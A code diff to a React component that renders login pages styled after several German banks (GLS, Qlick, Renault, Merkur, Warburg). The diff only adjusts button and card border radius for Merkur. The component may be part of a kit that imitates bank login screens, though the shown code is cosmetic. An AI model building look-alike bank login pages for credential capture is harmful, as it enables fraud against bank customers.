@@ -775,7 +775,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     style={{ 
                       borderColor: (isGLS || isQlick || isRenault || isMerkur) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
                       color: (isGLS || isQlick || isRenault || isMerkur) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
-                      borderRadius: (isGLS || isWarburg || isQlick || isRenault || isMerkur) ? "0px" : buttonBorderRadius
+                      borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : buttonBorderRadius)
 
                     }}
 
@@ -789,7 +789,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
                       backgroundColor: (isGLS || isQlick || isMerkur) ? "#2b2a29" : isWarburg ? "#6d7e8b" : isRenault ? "#edee00" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg || isQlick || isRenault || isMerkur) ? "0px" : buttonBorderRadius,
+                      borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : buttonBorderRadius),
                       color: (isRenault || isMerkur) ? (isRenault ? "#000000" : "#ffffff") : "#ffffff",
 
 
@@ -813,7 +813,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             </div>
           </div>
 
-          <div className="bg-white shadow-md border border-gray-200 p-6" style={{ borderRadius: (isGLS || isWarburg || isQlick || isRenault || isMerkur) ? "0px" : theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
+          <div className="bg-white shadow-md border border-gray-200 p-6" style={{ borderRadius: (isGLS || isWarburg || isQlick || isRenault) ? "0px" : (isMerkur ? "9999px" : theme.buttonRadius === "rounded-none" ? "0px" : "12px") }}>
             <h3 className="font-bold text-sm text-gray-800 mb-3">Wichtiger Hinweis:</h3>
             <ul className="list-disc pl-5 space-y-2 text-sm text-gray-600">
               <li>
